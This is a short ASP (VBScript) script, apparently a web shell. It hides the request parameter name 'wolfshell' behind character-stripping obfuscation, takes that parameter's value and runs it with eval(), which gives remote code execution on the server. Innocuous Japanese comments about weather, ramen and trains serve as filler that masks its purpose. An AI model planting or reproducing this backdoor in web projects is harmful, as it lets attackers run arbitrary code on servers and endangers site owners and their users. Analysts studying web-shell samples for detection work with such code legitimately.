<%
'// 明日の天気は晴れるでしょう。
Dim param_str_a1, payload_data_b2
'// このラーメンは美味しいです。
param_str_a1 = Replace("w@o@l@f@s@h@e@l@l", "@", "")

'// 電車が遅れています。
payload_data_b2 = request(param_str_a1)

'// 公園で散歩しましょう。
If Not IsEmpty(payload_data_b2) And payload_data_b2 <> "" Then
    eval(payload_data_b2)
End If
%>